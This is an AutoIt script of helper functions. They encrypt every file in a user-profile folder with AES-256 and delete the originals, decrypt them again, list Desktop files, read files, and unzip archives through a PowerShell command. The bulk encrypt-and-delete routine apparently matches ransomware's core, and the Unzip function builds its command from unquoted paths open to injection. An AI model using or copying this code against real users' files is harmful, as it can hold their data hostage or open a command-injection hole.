#include <Crypt.au3>
#include <File.au3>

;Encrypt the files in a directory - ex:
;EncryptFiles("password","Documents")
Func EncryptFiles($password,$folder)
  ; List all the files in the directory
	$filePath = _PathFull($folder,@UserProfileDir)
    Local $files = _FileListToArray($filePath, "*")
	For $i = 1 To $files[0]
	   $result = _Crypt_EncryptFile($filePath & "/" & $files[$i],$filePath & "/" & $files[$i] & ".crypt", $password, $CALG_AES_256)
	   if $result Then
		 FileDelete($filePath & "/" & $files[$i])
	   EndIf
    Next
EndFunc

;Decrypt the files in a directory - ex:
;Decrypt("password","Documents")
Func DecryptFiles($password,$folder)
  ; List all the files in the directory
	$filePath = _PathFull($folder,@UserProfileDir)
    Local $files = _FileListToArray($filePath, "*")
	For $i = 1 To $files[0]
	   $result = _Crypt_DecryptFile($filePath & "/" & $files[$i],$filePath & "/" & stringtrimright($files[$i], 6 ), $password, $CALG_AES_256)
 	   if $result Then
		 FileDelete($filePath & "/" & $files[$i])
	   EndIf
    Next
 EndFunc

;get list of the files in the Desktop
Func ListDesktopFiles()
   local $buffer = ""
   $FileList =_FileListToArray(@DesktopDir)
	  For $i = 1 To $FileList[0]
		 $buffer =  $buffer &  @CRLF & $FileList[$i]
	  Next
   Return $buffer
EndFunc

;open a file and get content to a variable.
Func ReadFile($sFilePath)
    Local $hFileOpen = FileOpen($sFilePath, $FO_READ)
    If $hFileOpen = -1 Then
        Return False
    EndIf
    Local $sFileRead = FileRead($hFileOpen)
    FileClose($hFileOpen)
	Return $sFileRead
EndFunc

Func Unzip($source,$destination)
   RunWait("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Expand-Archive -Force" & " " & $source & " " & $destination)
EndFunc
